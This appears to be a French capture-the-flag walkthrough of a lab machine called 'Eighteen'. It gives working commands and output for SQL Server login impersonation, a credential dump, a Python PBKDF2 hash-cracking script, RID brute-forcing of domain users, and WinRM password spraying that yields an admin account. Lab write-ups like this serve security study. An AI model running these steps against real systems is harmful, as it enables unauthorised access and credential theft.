# Eighteen

IP : 10.129.22.245
CRENDENTIAL : kevin / iNa2we6haRj2gaw!
/etc/hosts : 10.129.22.245   eighteen.htb



## USER

nmap 
	nmap 10.129.22.245 -A -sCV -p- -T4
		80/tcp   open  http     syn-ack ttl 127 Microsoft IIS httpd 10.0
		1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RC0+



On va se connecter au serveur sql grace au identifiant :

	mssqlclient.py "kevin":"iNa2we6haRj2gaw\!"@"10.129.22.245"



Une fois connecter on va enumerer les tables :
	SELECT name FROM master..sysdatabases;
		financial_planner

One voit plusieurs tables mais la plus interessante est : financial_planner, mais on pas les acces 
On peut chercher un moyen de les obtenir : 


	SQL (kevin  guest@msdb)> enum_impersonate
		execute as   database   permission_name   state_desc   grantee   grantor   
		----------   --------   ---------------   ----------   -------   -------   
		b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev 

permission_name: IMPERSONATE → indique que l'utilisateur kevin peut usurper l'identité d’un autre utilisateur SQL Server.
grantee: kevin → c’est toi, l'utilisateur connecté.
grantor: appdev → c’est l’utilisateur qui a accordé cette permission à kevin.
b'LOGIN': signifie que cette permission d’usurpation est au niveau serveur (sur un LOGIN et non un utilisateur de base).


Pour utiliser les doit de appdev :
	EXECUTE AS LOGIN = 'appdev';


puis 

	SQL (appdev  guest@msdb)> SELECT name FROM master..sysdatabases;
		name                
		-----------------   
		master              
		tempdb              
		model               
		msdb                
		financial_planner 


	SQL (appdev  guest@msdb)> USE financial_planner;

	SQL (appdev  appdev@financial_planner)> SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
		TABLE_NAME    
		-----------   
		users         
		incomes       
		expenses     
		allocations   
		analytics     
		visits 


La table users contient souvent mot de passe :

	SQL (appdev  appdev@financial_planner)> Select * from users;
		  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
		----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
		1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   

On se retrouve maintenant avec les identifiant et mot de pass ( en hash ) de l'admin de l'applciation WEB

Pour cracker le mot de passe utiliser le code python :

```python3

import hashlib
import sys

def crack_pbkdf2_sha256(hash_line, wordlist_path):
    try:
        # Décomposer le hash
        algo_info, salt, target_hash = hash_line.strip().split('$')
        _, algo, iterations = algo_info.split(':')

        iterations = int(iterations)

        print(f"[+] Hash info: algo=PBKDF2-{algo}, iterations={iterations}, salt={salt}")

        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                password = password.strip()
                test_hash = hashlib.pbkdf2_hmac(
                    algo,
                    password.encode(),
                    salt.encode(),
                    iterations
                ).hex()

                if test_hash == target_hash:
                    print(f"[✅] Mot de passe trouvé : {password}")
                    return password

        print("[❌] Mot de passe introuvable dans la wordlist.")
        return None

    except Exception as e:
        print(f"[!] Erreur : {e}")
        sys.exit(1)

# --- Configuration ---
hash_input = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
wordlist_path = "/usr/share/wordlists/rockyou.txt"  # Modifie selon ton système

# --- Lancement ---
crack_pbkdf2_sha256(hash_input, wordlist_path)


```

Pour le lancer :

	python3 crack_hash.py
		[+] Hash info: algo=PBKDF2-sha256, iterations=600000, salt=AMtzteQIG7yAbZIa
		[✅] Mot de passe trouvé : iloveyou1





Afficher les utilisateur présent dans le domanine grace au mssql : 
	nxc mssql 10.129.22.245 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth

		MSSQL       10.129.22.245   1433   DC01             1000: EIGHTEEN\DC01$
		MSSQL       10.129.22.245   1433   DC01             1101: EIGHTEEN\DnsAdmins
		MSSQL       10.129.22.245   1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
		MSSQL       10.129.22.245   1433   DC01             1601: EIGHTEEN\mssqlsvc
		MSSQL       10.129.22.245   1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
		MSSQL       10.129.22.245   1433   DC01             1603: EIGHTEEN\HR
		MSSQL       10.129.22.245   1433   DC01             1604: EIGHTEEN\IT
		MSSQL       10.129.22.245   1433   DC01             1605: EIGHTEEN\Finance
		MSSQL       10.129.22.245   1433   DC01             1606: EIGHTEEN\jamie.dunn
		MSSQL       10.129.22.245   1433   DC01             1607: EIGHTEEN\jane.smith
		MSSQL       10.129.22.245   1433   DC01             1608: EIGHTEEN\alice.jones
		MSSQL       10.129.22.245   1433   DC01             1609: EIGHTEEN\adam.scott
		MSSQL       10.129.22.245   1433   DC01             1610: EIGHTEEN\bob.brown
		MSSQL       10.129.22.245   1433   DC01             1611: EIGHTEEN\carol.white
		MSSQL       10.129.22.245   1433   DC01             1612: EIGHTEEN\dave.green




On va essayer de voir si un utilisateur a le mot de passe iloveyou1 comment password de sessions
	nxc winrm 10.129.22.245 -u users.txt -p iloveyou1
		WINRM       10.129.22.245   5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (admin)


On peut maintenant se connecter a son compte 


## ADMIN


